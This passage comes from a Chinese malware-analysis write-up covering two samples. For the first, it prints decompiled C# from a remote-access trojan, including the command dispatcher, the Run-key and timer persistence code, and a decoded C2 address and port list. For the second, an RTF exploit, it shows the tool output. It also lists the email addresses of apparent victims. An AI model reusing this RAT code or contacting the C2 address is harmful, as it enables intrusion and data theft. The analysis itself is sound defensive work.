</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#39;|&#39;</span>
</span></span><span style=display:flex><span>    })[<span style=color:#ae81ff>0</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivacname = Environment.MachineName;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivauname = Environment.UserName;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivauip = <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.dlrarhsivalancard = <span style=color:#e6db74>&#34;&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>:::</p></li><li><p>Others
由於攻擊者可以使用的command實在是太多了，所以就直接列出來看比較清楚
<img src=https://hackmd.io/_uploads/Hyb8sb766.png alt=image>
比較重要的是get_command這個method，這個就和前面提到的pull data那個差不多，只是他後面還會帶上command和argument，便於下一些指令</p><p>另外，<code>dlrarhsivaimage_info()</code>這個method主要是看指定的圖片的一些相關資訊並且把該檔案上傳到某個地方，除此之外，還可以做到刪除檔案、上傳檔案、儲存檔案、查看user資訊等等，所有的command可以查看<code>dlrarhsivasee_responce()</code>這個method，裡面有紀錄所有遇到不同的command會執行對應的method(共有25個，詳細source code如下)
:::spoiler</p><pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.MLREDM
// Token: 0x06000018 RID: 24 RVA: 0x00002EB8 File Offset: 0x000010B8
private void dlrarhsivasee_responce()
{
    if (!this.dlrarhsivaiswitch)
    {
        this.dlrarhsivaiswitch = true;
        this.dlrarhsivanetStream = this.dlrarhsivaCMD.dlrarhsivaNS(this.dlrarhsivatcpsck);
        this.dlrarhsivacapScreen = false;
        while (this.dlrarhsivais_working)
        {
            MLREDM.&lt;&gt;c__DisplayClasse CS$&lt;&gt;8__locals1 = new MLREDM.&lt;&gt;c__DisplayClasse();
            CS$&lt;&gt;8__locals1.&lt;&gt;4__this = this;
            CS$&lt;&gt;8__locals1.switchType = this.dlrarhsivaget_command();
            if (CS$&lt;&gt;8__locals1.switchType == null)
            {
                this.dlrarhsivais_working = false;
                break;
            }
            this.dlrarhsivareqCnls = false;
            string text = CS$&lt;&gt;8__locals1.switchType[0].ToLower();
            if (text.Split(new char[]
            {
                &#39;-&#39;
            }).Length &gt; 1)
            {
                text = &#34;dlrarhsiva-&#34; + text.Split(new char[]
                {
                    &#39;-&#39;
                })[1];
            }
            else
            {
                text = &#34;dlrarhsiva-&#34; + text;
            }
            string text2 = text;
            switch (text2)
            {
            case &#34;dlrarhsiva-procl&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    this.dlrarhsivalist_processes(&#34;procl&#34;);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-getavs&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    this.dlrarhsivalist_processes(&#34;getavs&#34;);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-thumb&#34;:
                this.dlrarhsivaimage_info(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-putsrt&#34;:
                this.dlrarhsivaload_app();
                break;
            case &#34;dlrarhsiva-filsz&#34;:
                this.dlrarhsivafile_info(CS$&lt;&gt;8__locals1.switchType[1], false);
                break;
            case &#34;dlrarhsiva-rupth&#34;:
                this.dlrarhsivapush_data(null, &#34;dlrarhsiva-appth=|dlrarhsiva&#34;.Split(new char[]
                {
                    &#39;|&#39;
                })[0] + DLAONIF.dlrarhsivaget_mpath(), false);
                break;
            case &#34;dlrarhsiva-dowf&#34;:
                this.dlrarhsivasaveFile(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-endpo&#34;:
                try
                {
                    Process.GetProcessById((int)Convert.ToInt16(CS$&lt;&gt;8__locals1.switchType[1].Trim())).Kill();
                }
                catch
                {
                }
                break;
            case &#34;dlrarhsiva-scrsz&#34;:
                this.dlrarhsivascreenSize(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-cscreen&#34;:
                this.dlrarhsivasee_scren(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-dirs&#34;:
                this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivalistDrives));
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-stops&#34;:
                this.dlrarhsivacapScreen = false;
                break;
            case &#34;dlrarhsiva-scren&#34;:
                this.dlrarhsivacapScreen = true;
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivais_screen(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-cnls&#34;:
                this.dlrarhsivaautCnls = true;
                this.dlrarhsivareqCnls = true;
                this.dlrarhsivacapScreen = false;
                break;
            case &#34;dlrarhsiva-udlt&#34;:
                this.dlrarhsivaCMD.dlrarhsivaremove_user();
                break;
            case &#34;dlrarhsiva-delt&#34;:
                this.dlrarhsivaremove_file(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-afile&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivasend_auto(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-listf&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivaHD.dlrarhsivalookFiles(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-file&#34;:
                this.dlrarhsivafunStarter = delegate()
                {
                    CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_file(CS$&lt;&gt;8__locals1.switchType[1]);
                };
                this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-info&#34;:
                this.dlrarhsivafunThread = new Thread(new ThreadStart(this.dlrarhsivauser_info));
                this.dlrarhsivafunThread.Start();
                break;
            case &#34;dlrarhsiva-runf&#34;:
                this.dlrarhsivaCMD.dlrarhsivado_process(CS$&lt;&gt;8__locals1.switchType[1].Split(new char[]
                {
                    &#39;&gt;&#39;
                })[0]);
                break;
            case &#34;dlrarhsiva-fles&#34;:
            {
                string files = this.dlrarhsivaHD.dlrarhsivalookupFiles(CS$&lt;&gt;8__locals1.switchType[1]);
                if (files != null)
                {
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_data(null, &#34;dlrarhsiva-fles=|dlrarhsiva&#34;.Split(new char[]
                        {
                            &#39;|&#39;
                        })[0] + files, false);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                }
                break;
            }
            case &#34;dlrarhsiva-dowr&#34;:
                this.dlrarhsivasaveFile(CS$&lt;&gt;8__locals1.switchType[1]);
                break;
            case &#34;dlrarhsiva-fldr&#34;:
            {
                string Folders = this.dlrarhsivaHD.dlrarhsivacheckFolders(CS$&lt;&gt;8__locals1.switchType[1]);
                if (Folders != null)
                {
                    this.dlrarhsivafunStarter = delegate()
                    {
                        CS$&lt;&gt;8__locals1.&lt;&gt;4__this.dlrarhsivapush_data(null, &#34;dlrarhsiva-fldr=|dlrarhsiva&#34;.Split(new char[]
                        {
                            &#39;|&#39;
                        })[0] + Folders, false);
                    };
                    this.dlrarhsivafunThread = new Thread(this.dlrarhsivafunStarter);
                    this.dlrarhsivafunThread.Start();
                }
                break;
            }
            }
        }
        this.dlrarhsivais_working = false;
        this.dlrarhsivacapScreen = false;
    }
    this.dlrarhsivaiswitch = false;
}
</code></pre><p>:::</p></li></ol><h3 id=常駐方式>常駐方式
<a class=anchor href=#%e5%b8%b8%e9%a7%90%e6%96%b9%e5%bc%8f>#</a></h3><ol><li>根據Any.Run的ATT&amp;CK Matrix以及我自己分析的結果，看到他使用timer這個方式當作persisten的手法，當do_start() method啟動之後，隔一段時間就會觸發連線，並且每隔一段時間就會重新檢查connection(雖然Any.Run沒有看出來)，所以我猜這個手法對應的<a href=https://attack.mitre.org/techniques/T1053/006/>ATT&amp;CK ID應該是T1053.006</a><pre tabindex=0><code class=language-csharp! data-lang=csharp!>public void dlrarhsivado_start()
{
    DLAONIF.dlrarhsivaport = DLAONIF.ports[0];
    this.dlrarhsivaUPC = new MLRLEINF();
    this.dlrarhsivaCMD = new OLRDMR(this);
    this.dlrarhsivaHD.iserver = this;
    this.dlrarhsivaHD.dlrarhsivamainPath = DLAONIF.dlrarhsivaget_mpath();
    TimerCallback callback = new TimerCallback(this.dlrarhsivalookup_connect);
    System.Threading.Timer dlrarhsivatimer = new System.Threading.Timer(callback, this.dlrarhsivaStateObj, 31280, 37420);
    this.dlrarhsivaStateObj.dlrarhsivatimer = dlrarhsivatimer;
}
</code></pre></li><li>另外，無意間用Autorun發現他有把<code>Hdlharas\dlrarhsiva.exe</code>註冊到registry中，這也是常見的套路，以ATT&amp;CK的framework來說，應該是<a href=https://attack.mitre.org/techniques/T1547/001/>T1547.001</a>(Any.Run還是沒有看出來)，詳細的code如下
<img src=https://hackmd.io/_uploads/rygmHumT6.png alt=圖片><pre tabindex=0><code class=language-csharp! data-lang=csharp!>public static void dlrarhsivaset_run(string app, string path)
{
    try
    {
        string name = &#34;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|dlrarhsiva&#34;.Split(new char[]
        {
            &#39;|&#39;
        })[0];
        RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
        string str = DLAONIF.dlrarhsivapc_id;
        object value = registryKey.GetValue(str + app);
        if (value == null)
        {
            registryKey.SetValue(str + app, path);
        }
        else if (value.ToString() != path)
        {
            registryKey.SetValue(str + app, path);
        }
    }
    catch
    {
    }
}
</code></pre>這是在<code>DLAONIF</code>這個module中，主要會由<code>MLREDM/dlrarhsivaload_app</code>這個method呼叫到，對應倒的指令是==dlrarhsiva-putsrt==
<img src=https://hackmd.io/_uploads/SJqMqdXa6.png alt=圖片></li></ol><h2 id=中繼站>中繼站
<a class=anchor href=#%e4%b8%ad%e7%b9%bc%e7%ab%99>#</a></h2><h3 id=基本資訊>基本資訊
<a class=anchor href=#%e5%9f%ba%e6%9c%ac%e8%b3%87%e8%a8%8a>#</a></h3><p>在前面提到的後門功能中有一個是專門處理網路連線的(<code>dlrarhsivaIPSConfig</code>)，這其實蠻有趣的，他不直接寫出連線的IP，反而是做了簡單的ascii轉換後才進行連線，如下所示</p><ol><li>MLREDM/dlrarhsivaIPSConfig()
這一段主要是進行連線，但是在連線前會進行IP parsing和fetching port的動作(如下一段所示)<pre tabindex=0><code class=language-csharp! data-lang=csharp!>// dlrarhsiva.MLREDM
// Token: 0x0600001A RID: 26 RVA: 0x0000365C File Offset: 0x0000185C
private bool dlrarhsivaIPSConfig()
{
    bool result;
    try
    {
        DLAONIF.dlrarhsivadefaultP = this.dlrarhsivaCMD.dlrarhsivaserverIPD();
        this.dlrarhsivatcpsck = new TcpClient();
        this.dlrarhsivatcpsck.Connect(DLAONIF.dlrarhsivadefaultP, DLAONIF.dlrarhsivaport);
        result = true;
    }
    catch
    {
        this.dlrarhsivaports_switch();
        result = false;
    }
    return result;
}
</code></pre></li><li>OLRDMR/dlrarhsivaserverIPD()
這一段就是把DLAONIF.dlrarhsivavpsips轉換成UTF-8而已，原本是ascii的integer形式，轉換後就變成一般的ascii string，也就是==185.136.161.124==<pre tabindex=0><code class=language-csharp! data-lang=csharp!>using System;
using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace dlrarhsiva
{
    // Token: 0x02000009 RID: 9
    internal class OLRDMR
    {
        ...
        public string dlrarhsivaserverIPD()
        {
            return Encoding.UTF8.GetString(DLAONIF.dlrarhsivavpsips, 0, DLAONIF.dlrarhsivavpsips.Length);
        }
        ...
        // Token: 0x0400003A RID: 58
        public MLREDM server;
    }
}
</code></pre></li><li>DLAONIF/
也可以自行轉換下面的IP，另外他有好幾個Port，詳細的code可以參考MLREDM/dlrarhsivaports_switch()這個method，在default port 6128連不上去的時候可以自行切換預先設定好的port number<pre tabindex=0><code class=language-csharp! data-lang=csharp!>using System;
using System.IO;
using System.Windows.Forms;
using Microsoft.Win32;

namespace dlrarhsiva
{
    // Token: 0x02000002 RID: 2
    internal static class DLAONIF
    {
        ...
        public static int[] ports = new int[]
        {
            6128,
            8761,
            11614,
            15822,
            17443
        };

        // Token: 0x04000005 RID: 5
        public static byte[] dlrarhsivavpsips = new byte[]
        {
            49,
            56,
            53,
            46,
            49,
            51,
            54,
            46,
            49,
            54,
            49,
            46,
            49,
            50,
            52
        };

        // Token: 0x0400000A RID: 10
        public static string dlrarhsivaAppPath = &#34;&#34;;
    }
}
</code></pre></li></ol><h3 id=關連資訊>關連資訊
<a class=anchor href=#%e9%97%9c%e9%80%a3%e8%b3%87%e8%a8%8a>#</a></h3><p>我不是很確定關聯資訊想要的形式是什麼，所以我選擇參考<a href=https://ipwhoisinfo.com/ip/185.136.161.124>whois的結果</a>和<a href=https://www.virustotal.com/gui/file/0335de8eadbbd5dc7cbe92ef869bcea6f6596ac39a38680142c982ec6e97ecde/behavior>VirusTotal的結果</a>互相對照，這個IP是來自於法國的Strasbourg，是在德國與法國超邊界的地方</p><h2 id=威脅情資>威脅情資
<a class=anchor href=#%e5%a8%81%e8%84%85%e6%83%85%e8%b3%87>#</a></h2><h3 id=攻擊者>攻擊者
<a class=anchor href=#%e6%94%bb%e6%93%8a%e8%80%85>#</a></h3><p><code>Duty Staff Officer &lt;ram.ratan909@navy.gov.in></code>，我在OSINT的各個online tool都沒有找到相關的資訊，而且有些甚至還說這是valid，想一想也對，這個mail的format看起來是屬於政府單位，所以我猜可能是政府單位的某個AD account被拿下來，然後就發送這樣的訊息出去，成功率看起來也會比較高
:::danger
正確答案是攻擊者可以篡改mail文件中的寄送人和router資訊，所以要實際去裡面看寄送的IP，有可能這個就是該攻擊者的C2 Server，所以其實攻擊者沒有把AD account拿下來
:::</p><h3 id=攻擊時間>攻擊時間
<a class=anchor href=#%e6%94%bb%e6%93%8a%e6%99%82%e9%96%93>#</a></h3><p><code>Tue, 28 Apr 2020 10:50:41 +0530 (IST)</code></p><h3 id=受害者>受害者
<a class=anchor href=#%e5%8f%97%e5%ae%b3%e8%80%85>#</a></h3><p>從郵件中的CC User來看，&ldquo;可能"的受害者有以下幾個</p><pre tabindex=0><code>&#34;Wg Cdr MA  JAFFER ALI&#34; &lt;jdwcdma@iaf.nic.in&gt;
&#34;Wg Cdr PAWAN BENIWAL&#34; &lt;wanwal.26965@gov.in&gt;
&#34;Wg Cdr Kundan Kumar&#34;&lt;challenger@nic.in&gt;
&#34;Wing Commander Raji kurian&#34; &lt;yatch.master@gov.in&gt;
&#34;SLO 54 ASP&#34; &lt;teacher_town@nic.in&gt;
&#34;Gp Capt Atul Kumar Arora&#34; &lt;moon.light@gov.in&gt;
&#34;Flt Lt Richa Bansal&#34; &lt;mtl.amer@nic.in&gt;
</code></pre><hr><h1 id=樣本5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9>樣本(5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9)
<a class=anchor href=#%e6%a8%a3%e6%9c%ac5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9>#</a></h1><h2 id=惡意程式-1>惡意程式
<a class=anchor href=#%e6%83%a1%e6%84%8f%e7%a8%8b%e5%bc%8f-1>#</a></h2><h3 id=檔案資訊-1>檔案資訊
<a class=anchor href=#%e6%aa%94%e6%a1%88%e8%b3%87%e8%a8%8a-1>#</a></h3><ol><li>DIE(Detect It Easy)
<img src=https://hackmd.io/_uploads/BygTPpT2T.png alt=圖片>
從DIE來看並沒有什麼特別的packer或是linker，反而出現RTF格式，一開始不知道這是什麼，但根據<sup id=fnref:4><a href=#fn:4 class=footnote-ref role=doc-noteref>4</a></sup>的說明，應該可以理解成比較廣泛性的Word文字檔案<blockquote><p>富文本格式（Rich Text Format, 一般簡稱為RTF）是由微軟公司開發的跨平台文檔格式。大多數的文字處理軟體都能讀取和保存RTF文檔。RTF是Rich TextFormat的縮寫，意即多文本格式。這是一種類似DOC格式（Word文檔）的檔案，有很好的兼容性，使用Windows“附屬檔案”中的“寫字板”就能打開並進行編輯。RTF是一種非常流行的檔案結構，很多文字編輯器都支持它。一般的格式設定，比如字型和段落設定，頁面設定等等信息都可以存在RTF格式中，它能在一定程度上實現word與wps檔案之間的互訪。</p></blockquote></li><li>File/Stat/Exiftool
從以下的結果來看，這個檔案的確是RTF格式且Created Time是在2019年
:::spoiler Command Result<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9: Rich Text Format data, version 1, ANSI, code page 936, default middle east language ID <span style=color:#ae81ff>1025</span>
</span></span><span style=display:flex><span>$ exiftool 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>ExifTool Version Number         : 12.40
</span></span><span style=display:flex><span>File Name                       : 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>Directory                       : .
</span></span><span style=display:flex><span>File Size                       : <span style=color:#ae81ff>217</span> KiB
</span></span><span style=display:flex><span>File Modification Date/Time     : 2023:08:14 11:54:52+08:00
</span></span><span style=display:flex><span>File Access Date/Time           : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
</span></span><span style=display:flex><span>File Permissions                : -rwxrwxrwx
</span></span><span style=display:flex><span>File Type                       : RTF
</span></span><span style=display:flex><span>File Type Extension             : rtf
</span></span><span style=display:flex><span>MIME Type                       : text/rtf
</span></span><span style=display:flex><span>Warning                         : Unsupported RTF encoding cp936. Will assume Latin.
</span></span><span style=display:flex><span>Last Modified By                : Koby
</span></span><span style=display:flex><span>Create Date                     : 2019:12:24 10:28:00
</span></span><span style=display:flex><span>Modify Date                     : 2019:12:24 10:28:00
</span></span><span style=display:flex><span>Revision Number                 : <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Total Edit Time                 : <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Pages                           : <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Words                           : <span style=color:#ae81ff>252</span>
</span></span><span style=display:flex><span>Characters                      : <span style=color:#ae81ff>1441</span>
</span></span><span style=display:flex><span>Characters With Spaces          : <span style=color:#ae81ff>1690</span>
</span></span><span style=display:flex><span>Internal Version Number         : <span style=color:#ae81ff>117</span>
</span></span><span style=display:flex><span>$ stat 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>  File: 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>  Size: <span style=color:#ae81ff>222012</span>          Blocks: <span style=color:#ae81ff>440</span>        IO Block: <span style=color:#ae81ff>4096</span>   regular file
</span></span><span style=display:flex><span>Device: 66h/102d        Inode: <span style=color:#ae81ff>2814749767539972</span>  Links: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Access: <span style=color:#f92672>(</span>0777/-rwxrwxrwx<span style=color:#f92672>)</span>  Uid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>   Gid: <span style=color:#f92672>(</span> 1000/ sbk6401<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Access: 2024-02-29 16:55:48.947690500 +0800
</span></span><span style=display:flex><span>Modify: 2023-08-14 11:54:52.000000000 +0800
</span></span><span style=display:flex><span>Change: 2024-02-29 16:55:48.947690500 +0800
</span></span><span style=display:flex><span> Birth: -
</span></span></code></pre></div>:::</li><li>這一題在沒有看VirusTotal或是Any.Run的情況之下，我在local VM內真的看不出來有什麼問題，後來忍不住上網看一下相關的hash，發現他是使用==CVE-2017-11882==這個由Microsoft提出的漏洞開發出來的malware file<sup id=fnref:5><a href=#fn:5 class=footnote-ref role=doc-noteref>5</a></sup>，而比較新的版本大部分都已經被patch了，所以我在VM內才會找不出相關的攻擊痕跡(浪費了很多時間)
<img src=https://hackmd.io/_uploads/HkR0X4V66.png alt="螢幕擷取畫面 2024-03-05 135304">
從上圖來看，沒有看到任何執行EQNEDT32.EXE的process，為了能夠在local端實際看到攻擊的軌跡，我從學校的授權軟體網站中下載了Office 2016(原本是2021)，才發現相關的patch還沒普及到這個版本(是不是要通報一下計中呢??🤔)
<img src=https://hackmd.io/_uploads/H1NNEE4p6.png alt=image>
:::danger
這個CVE是錯的，和EQNEDT32.EXE有關的CVE有三個:
CVE-2017-11882
CVE-2018-0802
CVE-2018-0798
所以其實不是目前的這一個，這也證明了我找超久都沒有找到的EQNEDT32.EXE的洞是哪裡
:::</li></ol><h3 id=執行流程-1>執行流程
<a class=anchor href=#%e5%9f%b7%e8%a1%8c%e6%b5%81%e7%a8%8b-1>#</a></h3><p>:::info
因為這一題我是在已知漏洞CVE的前提下進行分析，所以我會先假裝在不知道的情況下，敘述我可能會如何分析，如果途中有某個地方是我不知道如何繼續進行或是某個background knowledge我一定先知道，我會標註其中
:::
:::danger
因為不能使用線上sandbox tools，所以其實應該要有command sense是直接使用RTFOBJ進行Parsing，並且針對Embedded的File去OSINT他就可能可以不需要透過AnyRun知道他是哪一個CVE造成的惡意樣本
:::</p><ol><li><p>Process Monitor
在執行一個可疑的file時，我會嘗試先用process monitor以及wireshark錄製其中盡可能詳細的所有過程(當然實行前一定要先snapshot)，然後看一下中間的過程有無觸及到CreateFile、WriteFiile以及registry這樣的操作
為了要更準確的filter不必要的紀錄，我設定的條件是:</p><ol><li>Operation is WriteFile then Include</li><li>Process Name is Wireshark.exe then Exclude</li><li>Process Name is dumpcap.exe then Exclude
<img src=https://hackmd.io/_uploads/SJBQ2N4p6.png alt=image>
接著我就發現有一個==EQNEDT32.exe==的process寫了一個intel.wll的檔案到<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>
<img src=https://hackmd.io/_uploads/HJF9n44p6.png alt=image>
當然這也要有足夠的經驗才有辦法更準確的猜測這是一個可能有問題的操作，所以這一個process有一部分是參考網路上CVE的說明才更確定這個方向是對的</li></ol></li><li><p>Analyze EQNEDT32.exe
為了更進一步知道我的想法是否正確，所以我修改了我的filter rule→</p><ol><li>Process Name is EQNEDT32.exe then Include</li><li>Process Name is Wireshark.exe then Exclude</li><li>Process Name is dumpcap.exe then Exclude</li></ol><p>發現有很多不同的process都有BoF的問題
<img src=https://hackmd.io/_uploads/SkNnCEN6a.png alt=image>
而直到比較後端的操作才出現CreateFile、WriteFile、CloseFile的操作，主要是
<code>C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll</code>和<code>C:\Users\REM\AppData\Local\Temp\8.t</code>
<img src=https://hackmd.io/_uploads/rkPe1HVa6.png alt=image></p></li><li><p>所以，到目前為止可以很確定的事情是這個RTF File，裡面運藏了一些檔案，所以我打算針對這個file進行靜態的分析，但是我當然看不懂office針對RTF的語法和結構為何，所以根據<sup id=fnref:6><a href=#fn:6 class=footnote-ref role=doc-noteref>6</a></sup>的說明提到可以用<a href=https://github.com/decalage2/oletools>RTFOBJ</a>這個tool，幫忙parse其中的內容，結果如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>$ rtfobj -s all 5bbf2643a601e632a49406483c8f
</span></span><span style=display:flex><span>c5262a76e206bd969f2ba3f4f2e238768ab9
</span></span><span style=display:flex><span>rtfobj 0.60.1 on Python 3.8.17 - http://decalage.info/python/oletools
</span></span><span style=display:flex><span>THIS IS WORK IN PROGRESS - Check updates regularly!
</span></span><span style=display:flex><span>Please report any issue at https://github.com/decalage2/oletools/issues
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================================</span>
</span></span><span style=display:flex><span>File: <span style=color:#e6db74>&#39;5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9&#39;</span> - size: <span style=color:#ae81ff>222012</span> bytes
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span>id |index     |OLE Object
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span>  |0000E970h |format_id: <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>Embedded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   |          |class name: b<span style=color:#e6db74>&#39;Package&#39;</span>
</span></span><span style=display:flex><span>   |          |data size: <span style=color:#ae81ff>73928</span>
</span></span><span style=display:flex><span>   |          |OLE Package object:
</span></span><span style=display:flex><span>   |          |Filename: <span style=color:#e6db74>&#39;8.t&#39;</span>
</span></span><span style=display:flex><span>   |          |Source path: <span style=color:#e6db74>&#39;C:\\Aaa\\tmp\\8.t&#39;</span>
</span></span><span style=display:flex><span>   |          |Temp path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t&#39;</span>
</span></span><span style=display:flex><span>   |          |MD5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;8eac8203cf56f2b24753986353deac7e&#39;</span>
</span></span><span style=display:flex><span>   |          |File Type: Unknown file type
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>1</span>  |00032B90h |format_id: <span style=color:#ae81ff>2</span> <span style=color:#f92672>(</span>Embedded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   |          |class name: b<span style=color:#e6db74>&#39;Equation.2\x00\x124Vx\x90\x124VxvT2&#39;</span>
</span></span><span style=display:flex><span>   |          |data size: <span style=color:#ae81ff>6436</span>
</span></span><span style=display:flex><span>   |          |MD5 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;a09e82c26f94f3a9297377120503a678&#39;</span>
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span><span style=color:#ae81ff>2</span>  |00032B76h |Not a well-formed OLE object
</span></span><span style=display:flex><span>---+----------+---------------------------------------------------------------
</span></span><span style=display:flex><span>Saving file from OLE Package in object <span style=color:#75715e>#0:</span>
</span></span><span style=display:flex><span>  Filename <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;8.t&#39;</span>
</span></span><span style=display:flex><span>  Source path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Aaa\\tmp\\8.t&#39;</span>
</span></span><span style=display:flex><span>  Temp path <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t&#39;</span>
</span></span><span style=display:flex><span>  saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t
</span></span><span style=display:flex><span>  md5 8eac8203cf56f2b24753986353deac7e
</span></span><span style=display:flex><span>Saving file embedded in OLE object <span style=color:#75715e>#1:</span>
</span></span><span style=display:flex><span>  format_id  <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>  class name <span style=color:#f92672>=</span> b<span style=color:#e6db74>&#39;Equation.2\x00\x124Vx\x90\x124VxvT2&#39;</span>
</span></span><span style=display:flex><span>  data size  <span style=color:#f92672>=</span> <span style=color:#ae81ff>6436</span>
</span></span><span style=display:flex><span>  saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B90.bin
</span></span><span style=display:flex><span>  md5 a09e82c26f94f3a9297377120503a678
</span></span><span style=display:flex><span>Saving raw data in object <span style=color:#75715e>#2:</span>
</span></span><span style=display:flex><span>  saving object to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B76.raw
</span></span><span style=display:flex><span>  md5 a3540560cf9b92c3bc4aa0ed52767b8a
</span></span></code></pre></div><p>我發現其實內藏的檔案其實是<code>8.t</code></p></li><li><p>Analyze RTF Malware File
我想要跟一下這個RTF因為stack overflow的問題到底是怎麼變成RCE的，所以我先用Proess Monitor知道他會call到CreateFile這個API，因此我先用x32dbg attach eqnedt32.exe這個file，然後設定breakpoint到kernelbase.dll中的CreateFileA這個API
<img src=https://hackmd.io/_uploads/r12X9ZUpa.png alt=圖片>
接著我直接啟動malware file，dbg會停在CreateFile上，此時我回去看stack上的return address
